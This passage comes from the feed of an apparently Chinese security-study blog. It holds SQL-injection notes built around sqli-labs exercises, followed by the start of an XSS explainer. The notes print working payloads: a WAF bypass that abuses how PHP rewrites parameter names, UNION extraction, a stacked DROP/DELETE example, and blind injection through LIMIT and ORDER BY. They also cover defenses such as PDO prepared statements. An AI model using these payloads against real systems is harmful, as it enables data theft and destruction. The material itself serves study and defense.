class=\"line\">\t\t\techo &quot;非法字符!&quot;;</span><br><span class=\"line\">\t\t\texit();</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>第二层过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* 检查和转义字符 */</span><br><span class=\"line\">function safe_str($str)&#123;</span><br><span class=\"line\">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">        if( is_array($str) ) &#123;</span><br><span class=\"line\">            foreach($str as $key =&gt; $value) &#123;</span><br><span class=\"line\">                $str[$key] = safe_str($value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $str = addslashes($str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function dhtmlspecialchars($string) &#123;</span><br><span class=\"line\">    if(is_array($string)) &#123;</span><br><span class=\"line\">        foreach($string as $key =&gt; $val) &#123;</span><br><span class=\"line\">            $string[$key] = dhtmlspecialchars($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $string = str_replace(array(&#x27;&amp;&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;), array(&#x27;&amp;amp;&#x27;, &#x27;&amp;quot;&#x27;, &#x27;&amp;lt;&#x27;, &#x27;&amp;gt;&#x27;,&#x27;（&#x27;,&#x27;）&#x27;), $string);</span><br><span class=\"line\">        if(strpos($string, &#x27;&amp;amp;#&#x27;) !== false) &#123;</span><br><span class=\"line\">            $string = preg_replace(&#x27;/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;, &#x27;&amp;\\\\1&#x27;, $string);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $string;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此该系统对于输入处理的过程如下</p>\n<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>\n<p>但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$request_uri = explode(&quot;?&quot;, $_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class=\"line\">if (isset($request_uri[1])) &#123;</span><br><span class=\"line\">\t$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class=\"line\">\tforeach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$_value = explode(&quot;=&quot;, $value);</span><br><span class=\"line\">\t\tif (isset($_value[1])) &#123;</span><br><span class=\"line\">\t\t\t$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义</p>\n<p>当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf</p>\n<p>但 php 的另一个特性：</p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>也就是说，php 会认为 i_d 和 i.d 是同一个参数</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>因此在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>如果我们要利用这个特性，那么必须满足几点：</p>\n<p>1. 有注入点</p>\n<p>2. 注入点可控变量需要获取自 $_REQUEST</p>\n<p>3. 变量的名字必须包含下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static function GetOne($data = array())&#123;</span><br><span class=\"line\">    global $mysql;</span><br><span class=\"line\">    $user_id = isset($data[&#x27;user_id&#x27;])?$data[&#x27;user_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $username = isset($data[&#x27;username&#x27;])?$data[&#x27;username&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $password = isset($data[&#x27;password&#x27;])?$data[&#x27;password&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $email = isset($data[&#x27;email&#x27;])?$data[&#x27;email&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $type_id = isset($data[&#x27;type_id&#x27;])?$data[&#x27;type_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class=\"line\">         `user_id` int(11) NOT NULL DEFAULT &#x27;0&#x27;)&quot;;</span><br><span class=\"line\">    $mysql -&gt;db_query($sql);</span><br></pre></td></tr></table></figure>\n<p>以上代码满足了上面的三个要求</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//由于=被过滤，需要使用like，同时对数据库进行16进制编码</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h5 id=\"order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by注入\">#</a> order by 注入</h5>\n<p>order by 是 mysql 中对查询数据进行排序的方法， 使用示例</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">asc</span>;  #升序(默认升序)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">desc</span>;  #降序</span><br></pre></td></tr></table></figure>\n<p>这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:</p>\n<p>因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id;</span><br><span class=\"line\">selecr <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>基于 if 盲注：</p>\n<p>需要知道列名</p>\n<p>order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>\n<p>这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,id,username);</span><br><span class=\"line\">order by if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure>\n<p>如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面</p>\n<p>基于时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,1,sleep(1))</span><br></pre></td></tr></table></figure>\n<p>基于 rand () 盲</p>\n<p>可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(ascii(mid((select database()),1,1))&gt;96)</span><br></pre></td></tr></table></figure>\n<p>基于报错注入：</p>\n<p>updatexml 和 extravalue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常</span><br><span class=\"line\">select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错</span><br></pre></td></tr></table></figure>\n<p>order by 注入的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &#x27;select * from admin where username=&#x27;&quot;.$username.&quot;&#x27;&#x27;;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$row = mysql_fetch_array($result);</span><br><span class=\"line\">if(isset($row)&amp;&amp;row[&#x27;username&#x27;]!=&quot;admin&quot;)&#123;</span><br><span class=\"line\">\t$hit=&quot;username error!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tif ($row[&#x27;password&#x27;] === $password)&#123;</span><br><span class=\"line\">\t\t$hit=&quot;&quot;;</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t$hit=&quot;password error!&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">             </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=admin&#x27; union 1,2,&#x27;字符串&#x27; order by 3</span><br></pre></td></tr></table></figure>\n<p>或者一般存在的注入点为：可控制的位置在 <code>order by</code>  子句后，如下 order 参数可控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from goods order by $_GET[&#x27;order&#x27;]&quot;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=\">Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=\">sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入</span></p>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>预处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s\">PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        },
        {
            "id": "http://example.com/2022/02/28/XSS/",
            "url": "http://example.com/2022/02/28/XSS/",
            "title": "XSS",
            "date_published": "2022-02-28T05:38:45.000Z",
            "content_html": "<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<h2 id=\"session-cookie\"><a class=\"markdownIt-Anchor\" href=\"#session-cookie\">#</a> session || cookie</h2>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw\">(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别</span></p>\n<h2 id=\"1反射型xss\"><a class=\"markdownIt-Anchor\" href=\"#1反射型xss\">#</a> 1. 反射型 xss</h2>\n<p>反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。</p>\n<h2 id=\"2存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#2存储型xss\">#</a> 2. 存储型 XSS</h2>\n<p>存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。</p>\n<h2 id=\"3基于dom的\"><a class=\"markdownIt-Anchor\" href=\"#3基于dom的\">#</a> 3. 基于 DOM 的</h2>\n<p>XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。</p>\n<p>URL 的每一个参数、URL 